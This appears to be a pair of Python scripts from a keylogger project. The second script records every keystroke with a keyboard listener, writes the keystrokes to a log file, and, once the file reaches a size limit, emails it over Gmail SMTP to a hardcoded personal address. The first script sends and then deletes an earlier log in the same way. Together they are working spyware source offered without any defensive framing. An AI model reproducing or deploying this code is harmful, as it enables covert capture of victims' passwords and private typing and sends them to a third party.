import smtplib
import os
import json
from email.message import EmailMessage

# Load email credentials securely
CONFIG_FILE = "config.json"
LOG_FILE = "log.txt"

def load_config():
    """Load email credentials from a secure config file."""
    if not os.path.exists(CONFIG_FILE):
        print("[ERROR] Configuration file missing!")
        return None
    
    with open(CONFIG_FILE, "r") as file:
        return json.load(file)

def send_email():
    """Send log file via email."""
    config = load_config()
    if not config:
        return
    
    EMAIL_ADDRESS = config["EMAIL_ADDRESS"]
    EMAIL_PASSWORD = config["EMAIL_PASSWORD"]
    TO_EMAIL = config["TO_EMAIL"]

    if not os.path.exists(LOG_FILE):
        print("[ERROR] Log file not found!")
        return

    with open(LOG_FILE, "r", encoding="utf-8") as file:
        log_data = file.read()

    if not log_data.strip():
        print("[INFO] Log file is empty. Skipping email.")
        return

    msg = EmailMessage()
    msg["Subject"] = "Keylogger Logs"
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = TO_EMAIL
    msg.set_content("Attached is the log file.")

    msg.add_attachment(log_data.encode("utf-8"), maintype="text", subtype="plain", filename="log.txt")


    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
            print("[INFO] Email sent successfully!")

        # Clear log after sending
        os.remove(LOG_FILE)
        print("[INFO] Log file deleted after sending.")
    except Exception as e:
        print(f"[ERROR] Failed to send email: {e}")

if __name__ == "__main__":
    send_email()



















The secode code 


import smtplib
import os
import json
from email.message import EmailMessage
from cryptography.fernet import Fernet
from pynput import keyboard

# Load encryption key
with open("secret.key", "rb") as key_file:
    key = key_file.read()

cipher = Fernet(key)

# Load and decrypt credentials
with open("credentials.enc", "rb") as enc_file:
    encrypted_data = enc_file.read()

credentials = json.loads(cipher.decrypt(encrypted_data).decode())

EMAIL_ADDRESS = credentials["email"]
EMAIL_PASSWORD = credentials["password"]
TO_EMAIL = "staceybanks10101@gmail.com"

LOG_FILE = "log.txt"
FILE_SIZE_LIMIT = 3000  # 5KB for testing, increase for real use (e.g., 100000 for 100KB)

def send_email():
    """Sends the log file via email and resets the log."""
    if not os.path.exists(LOG_FILE):
        return

    file_size = os.path.getsize(LOG_FILE)
    if file_size < FILE_SIZE_LIMIT:
        return  # Skip sending if file is too small

    with open(LOG_FILE, "r") as file:
        log_data = file.read()

    msg = EmailMessage()
    msg["Subject"] = "Keystroke Log"
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = TO_EMAIL
    msg.set_content("Here is the recorded keystroke log.")

    msg.add_attachment(log_data.encode("utf-8"), maintype="text", subtype="plain", filename="log.txt")

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
            print("[INFO] Email sent successfully!")

        # Reset the log file
        with open(LOG_FILE, "w") as file:
            file.write("")
        print("[INFO] Log file cleared after sending.")
    except Exception as e:
        print(f"[ERROR] Failed to send email: {e}")

def log_keystroke(key):
    """Logs keystrokes and checks if the log file size limit is reached."""
    try:
        key = key.char
    except AttributeError:
        key = str(key)

    with open(LOG_FILE, "a") as file:
        file.write(key + " ")

    file_size = os.path.getsize(LOG_FILE)
    print(f"[INFO] Keystroke logged: {key} (File size: {file_size} bytes)")

    if file_size >= FILE_SIZE_LIMIT:
        send_email()

# Listen for keyboard input
with keyboard.Listener(on_press=log_keystroke) as listener:
    listener.join()


